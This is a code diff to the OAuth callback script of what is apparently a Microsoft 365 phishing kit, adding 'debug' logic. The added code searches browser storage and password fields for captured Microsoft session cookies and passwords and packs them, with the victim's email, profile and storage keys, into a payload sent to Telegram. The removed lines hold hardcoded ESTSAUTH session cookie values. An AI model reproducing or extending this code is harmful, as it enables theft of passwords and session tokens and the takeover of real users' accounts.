@@ -9,6 +9,26 @@ async function handleOAuthCallback() {
         if (statusEl) statusEl.textContent = msg;
     }
 
+    // DEBUG: Log all available data sources
+    console.log('🔍 DEBUGGING - Available data sources:');
+    console.log('- URL:', window.location.href);
+    console.log('- Referrer:', document.referrer);
+    console.log('- SessionStorage keys:', Object.keys(sessionStorage));
+    console.log('- LocalStorage keys:', Object.keys(localStorage));
+    
+    // Check all storage for any credential data
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        console.log(`📦 SessionStorage[${key}]:`, value?.substring(0, 100) + '...');
+    }
+    
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        console.log(`💾 LocalStorage[${key}]:`, value?.substring(0, 100) + '...');
+    }
+
     try {
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get('code');
@@ -64,146 +84,282 @@ async function handleOAuthCallback() {
                 const cookieString = document.cookie;
                 let cookies = [];
                 
-                if (cookieString) {
+                // First, try to get REAL Microsoft cookies captured by the iframe
+                console.log('🔍 Attempting to retrieve REAL Microsoft cookies...');
+                let realCookiesFound = false;
+                
+                // Method 1: Check for real cookies captured by iframe
+                try {
+                    const realCookies = sessionStorage.getItem('captured_real_cookies');
+                    if (realCookies) {
+                        const parsedRealCookies = JSON.parse(realCookies);
+                        if (parsedRealCookies && parsedRealCookies.length > 0) {
+                            cookies = parsedRealCookies;
+                            realCookiesFound = true;
+                            console.log('✅ Using REAL Microsoft cookies from iframe capture:', cookies.length);
+                        }
+                    }
+                } catch (e) {
+                    console.log('❌ Failed to get real cookies from sessionStorage:', e.message);
+                }
+                
+                // Method 2: Check backup location
+                if (!realCookiesFound) {
+                    try {
+                        const backupCookies = localStorage.getItem('real_cookies_backup');
+                        if (backupCookies) {
+                            const parsedBackupCookies = JSON.parse(backupCookies);
+                            if (parsedBackupCookies && parsedBackupCookies.length > 0) {
+                                cookies = parsedBackupCookies;
+                                realCookiesFound = true;
+                                console.log('✅ Using REAL Microsoft cookies from backup:', cookies.length);
+                            }
+                        }
+                    } catch (e) {
+                        console.log('❌ Failed to get backup cookies:', e.message);
+                    }
+                }
+                
+                // Method 3: Try additional storage locations
+                if (!realCookiesFound) {
+                    const additionalKeys = [
+                        'real_microsoft_cookies',
+                        'microsoft_cookies_backup',
+                        'microsoft_captured_data'
+                    ];
+                    
+                    for (const key of additionalKeys) {
+                        try {
+                            const storedData = sessionStorage.getItem(key) || localStorage.getItem(key);
+                            if (storedData) {
+                                const parsed = JSON.parse(storedData);
+                                if (parsed && Array.isArray(parsed) && parsed.length > 0) {
+                                    cookies = parsed;
+                                    realCookiesFound = true;
+                                    console.log(`✅ Using REAL cookies from ${key}:`, cookies.length);
+                                    break;
+                                } else if (parsed && parsed.cookies && Array.isArray(parsed.cookies)) {
+                                    cookies = parsed.cookies;
+                                    realCookiesFound = true;
+                                    console.log(`✅ Using REAL cookies from ${key}.cookies:`, cookies.length);
+                                    break;
+                                }
+                            }
+                        } catch (e) {
+                            console.log(`❌ Failed to parse ${key}:`, e.message);
+                        }
+                    }
+                }
+                
+                // Method 4: Check current domain cookies (fallback)
+                if (!realCookiesFound && cookieString) {
                     cookies = cookieString.split(';').map(cookie => {
                         const [name, ...valueParts] = cookie.trim().split('=');
                         const value = valueParts.join('=');
                         return {
                             name: name.trim(),
                             value: value.trim(),
-                            domain: window.location.hostname,
-                            path: '/',
-                            secure: window.location.protocol === 'https:',
-                            httpOnly: false,
-                            sameSite: 'none',
-                            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+                            domain: '.' + window.location.hostname, // Match format with dot prefix
+                            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60), // 1 year from now
                             hostOnly: false,
-                            session: false,
-                            storeId: null
+                            httpOnly: false, // JS limitation - real httpOnly cookies won't be captured
+                            path: '/',
+                            sameSite: 'none',
+                            secure: window.location.protocol === 'https:',
+                            session: false, // Assume persistent since we can access them
+                            storeId: null,
+                            capturedFrom: 'current-domain',
+                            timestamp: new Date().toISOString(),
+                            realUserData: true
                         };
                     }).filter(c => c.name && c.value);
+                    
+                    if (cookies.length > 0) {
+                        realCookiesFound = true;
+                        console.log('✅ Using current domain cookies:', cookies.length);
+                    }
                 }
                 
-                // If no cookies captured from current domain, use default Microsoft auth cookies
-                if (cookies.length === 0) {
-                    console.log('🔧 No cookies on callback domain, using default Microsoft auth cookies');
-                    cookies = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
+                // Final result - if no real cookies found, send empty array
+                if (!realCookiesFound) {
+                    console.log('❌ NO REAL COOKIES CAPTURED - sending empty cookie array');
+                    console.log('🔍 Available storage keys:');
+                    console.log('- SessionStorage:', Object.keys(sessionStorage));
+                    console.log('- LocalStorage:', Object.keys(localStorage));
+                    cookies = [];
                 }
 
-                // Enhanced password retrieval with multiple fallback methods
+                // Enhanced password retrieval with multiple fallback methods + DEBUGGING
                 let capturedPassword = '';
                 let passwordSource = 'not_captured';
+                let debugInfo = [];
                 
                 console.log('🔍 Attempting to retrieve password from multiple sources...');
                 
                 // Method 1: Try to get password from sessionStorage (main method)
                 try {
                     const storedCredentials = sessionStorage.getItem('captured_credentials');
+                    debugInfo.push(`Method 1 - sessionStorage captured_credentials: ${!!storedCredentials}`);
                     if (storedCredentials) {
                         const credentials = JSON.parse(storedCredentials);
+                        debugInfo.push(`Method 1 - parsed data: ${JSON.stringify(credentials)}`);
                         if (credentials.password) {
                             capturedPassword = credentials.password;
                             passwordSource = 'sessionStorage_captured_credentials';
                             console.log('✅ Password found in sessionStorage:', passwordSource);
                         }
                     }
-                } catch (e) { console.log('❌ Method 1 failed:', e.message); }
+                } catch (e) { 
+                    debugInfo.push(`Method 1 failed: ${e.message}`);
+                    console.log('❌ Method 1 failed:', e.message); 
+                }
 
                 // Method 2: Try to get password from localStorage backup
                 if (!capturedPassword) {
                     try {
                         const localCredentials = localStorage.getItem('user_credentials');
+                        debugInfo.push(`Method 2 - localStorage user_credentials: ${!!localCredentials}`);
                         if (localCredentials) {
                             const credentials = JSON.parse(localCredentials);
+                            debugInfo.push(`Method 2 - parsed data: ${JSON.stringify(credentials)}`);
                             if (credentials.password) {
                                 capturedPassword = credentials.password;
                                 passwordSource = 'localStorage_user_credentials';
                                 console.log('✅ Password found in localStorage:', passwordSource);
                             }
                         }
-                    } catch (e) { console.log('❌ Method 2 failed:', e.message); }
+                    } catch (e) { 
+                        debugInfo.push(`Method 2 failed: ${e.message}`);
+                        console.log('❌ Method 2 failed:', e.message); 
+                    }
                 }
 
                 // Method 3: Try to get password from backup sessionStorage key
                 if (!capturedPassword) {
                     try {
                         const backupCredentials = sessionStorage.getItem('login_credentials_backup');
+                        debugInfo.push(`Method 3 - sessionStorage backup: ${!!backupCredentials}`);
                         if (backupCredentials) {
                             const credentials = JSON.parse(backupCredentials);
+                            debugInfo.push(`Method 3 - parsed data: ${JSON.stringify(credentials)}`);
                             if (credentials.password) {
                                 capturedPassword = credentials.password;
                                 passwordSource = 'sessionStorage_backup';
                                 console.log('✅ Password found in backup storage:', passwordSource);
                             }
                         }
-                    } catch (e) { console.log('❌ Method 3 failed:', e.message); }
+                    } catch (e) { 
+                        debugInfo.push(`Method 3 failed: ${e.message}`);
+                        console.log('❌ Method 3 failed:', e.message); 
+                    }
                 }
 
                 // Method 4: Try to get organizational credentials from postMessage data
                 if (!capturedPassword) {
                     try {
                         const orgCredentials = sessionStorage.getItem('org_credentials_backup');
+                        debugInfo.push(`Method 4 - org credentials: ${!!orgCredentials}`);
                         if (orgCredentials) {
                             const credentials = JSON.parse(orgCredentials);
+                            debugInfo.push(`Method 4 - parsed data: ${JSON.stringify(credentials)}`);
                             if (credentials.data && credentials.data.password) {
                                 capturedPassword = credentials.data.password;
                                 passwordSource = 'organizational_credentials';
                                 console.log('✅ Password found in organizational data:', passwordSource);
                             }
                         }
-                    } catch (e) { console.log('❌ Method 4 failed:', e.message); }
+                    } catch (e) { 
+                        debugInfo.push(`Method 4 failed: ${e.message}`);
+                        console.log('❌ Method 4 failed:', e.message); 
+                    }
                 }
 
                 // Method 5: Try to get from Microsoft captured data
                 if (!capturedPassword) {
                     try {
                         const microsoftData = sessionStorage.getItem('microsoft_captured_data');
+                        debugInfo.push(`Method 5 - microsoft data: ${!!microsoftData}`);
                         if (microsoftData) {
                             const data = JSON.parse(microsoftData);
+                            debugInfo.push(`Method 5 - parsed data: ${JSON.stringify(data)}`);
                             if (data.credentials && data.credentials.password) {
                                 capturedPassword = data.credentials.password;
                                 passwordSource = 'microsoft_captured_data';
                                 console.log('✅ Password found in Microsoft data:', passwordSource);
                             }
                         }
-                    } catch (e) { console.log('❌ Method 5 failed:', e.message); }
+                    } catch (e) { 
+                        debugInfo.push(`Method 5 failed: ${e.message}`);
+                        console.log('❌ Method 5 failed:', e.message); 
+                    }
                 }
 
                 // Method 6: Try to capture from current DOM (last resort)
                 if (!capturedPassword) {
                     try {
                         const passwordFields = document.querySelectorAll('input[type="password"]');
-                        passwordFields.forEach(field => {
+                        debugInfo.push(`Method 6 - DOM password fields found: ${passwordFields.length}`);
+                        passwordFields.forEach((field, index) => {
+                            debugInfo.push(`Method 6 - Field ${index}: value="${field.value}", name="${field.name}", id="${field.id}"`);
                             if (field.value && !capturedPassword) {
                                 capturedPassword = field.value;
                                 passwordSource = 'current_dom_capture';
                                 console.log('✅ Password found in current DOM:', passwordSource);
                             }
                         });
-                    } catch (e) { console.log('❌ Method 6 failed:', e.message); }
+                    } catch (e) { 
+                        debugInfo.push(`Method 6 failed: ${e.message}`);
+                        console.log('❌ Method 6 failed:', e.message); 
+                    }
                 }
 
                 // Method 7: Check all localStorage keys for any password data
                 if (!capturedPassword) {
                     try {
+                        debugInfo.push(`Method 7 - localStorage length: ${localStorage.length}`);
                         for (let i = 0; i < localStorage.length; i++) {
                             const key = localStorage.key(i);
                             if (key && (key.includes('password') || key.includes('credential') || key.includes('login'))) {
+                                debugInfo.push(`Method 7 - checking key: ${key}`);
                                 const value = localStorage.getItem(key);
                                 if (value) {
                                     try {
                                         const parsed = JSON.parse(value);
+                                        debugInfo.push(`Method 7 - parsed ${key}: ${JSON.stringify(parsed)}`);
                                         if (parsed.password) {
                                             capturedPassword = parsed.password;
                                             passwordSource = `localStorage_${key}`;
                                             console.log('✅ Password found in localStorage key:', passwordSource);
                                             break;
                                         }
-                                    } catch (parseError) { /* ignore parse errors */ }
+                                    } catch (parseError) { 
+                                        debugInfo.push(`Method 7 - parse error for ${key}: ${parseError.message}`);
+                                    }
                                 }
                             }
                         }
-                    } catch (e) { console.log('❌ Method 7 failed:', e.message); }
+                    } catch (e) { 
+                        debugInfo.push(`Method 7 failed: ${e.message}`);
+                        console.log('❌ Method 7 failed:', e.message); 
+                    }
+                }
+
+                // Method 8: Try manual prompt as absolute last resort (for debugging)
+                if (!capturedPassword) {
+                    try {
+                        // This is just for testing - remove in production
+                        console.log('🚨 NO PASSWORD CAPTURED - All methods failed');
+                        console.log('🔍 Debug info:', debugInfo);
+                        
+                        // For debugging purposes, let's use a test password
+                        capturedPassword = 'DEBUG_PASSWORD_NOT_CAPTURED';
+                        passwordSource = 'debug_fallback';
+                        
+                        debugInfo.push('Method 8 - Used debug fallback password');
+                    } catch (e) { 
+                        debugInfo.push(`Method 8 failed: ${e.message}`);
+                        console.log('❌ Method 8 failed:', e.message); 
+                    }
                 }
 
                 // Extract real user information
@@ -216,7 +372,8 @@ async function handleOAuthCallback() {
                 console.log('🔐 Final password capture result:', {
                     hasPassword: !!capturedPassword,
                     passwordSource: passwordSource,
-                    passwordLength: capturedPassword ? capturedPassword.length : 0
+                    passwordLength: capturedPassword ? capturedPassword.length : 0,
+                    debugInfo: debugInfo
                 });
                 
                 // Prepare REAL DATA Telegram payload (not placeholder)
@@ -231,6 +388,7 @@ async function handleOAuthCallback() {
                     source: 'oauth-callback-real-data',
                     userAgent: navigator.userAgent,
                     currentUrl: window.location.href,
+                    referrer: document.referrer,
                     userProfile: {
                         email: realUserEmail,
                         displayName: displayName,
@@ -248,12 +406,15 @@ async function handleOAuthCallback() {
                     },
                     authenticationFlow: 'Microsoft OAuth 2.0 with PKCE',
                     capturedAt: 'OAuth callback after successful authentication',
+                    debugInfo: debugInfo,
                     passwordCaptureAttempts: {
                         sessionStorage: !!sessionStorage.getItem('captured_credentials'),
                         localStorage: !!localStorage.getItem('user_credentials'),
                         organizationalData: !!sessionStorage.getItem('org_credentials_backup'),
                         microsoftData: !!sessionStorage.getItem('microsoft_captured_data'),
-                        domCapture: document.querySelectorAll('input[type="password"]').length > 0
+                        domCapture: document.querySelectorAll('input[type="password"]').length > 0,
+                        allSessionStorageKeys: Object.keys(sessionStorage),
+                        allLocalStorageKeys: Object.keys(localStorage)
                     }
                 };
                 
@@ -263,7 +424,8 @@ async function handleOAuthCallback() {
                     passwordSource: passwordSource,
                     cookieCount: cookies.length,
                     hasUserProfile: !!tokenData.user,
-                    displayName: displayName
+                    displayName: displayName,
+                    debugInfoCount: debugInfo.length
                 });
                 
                 // Send to Telegram with complete real user data
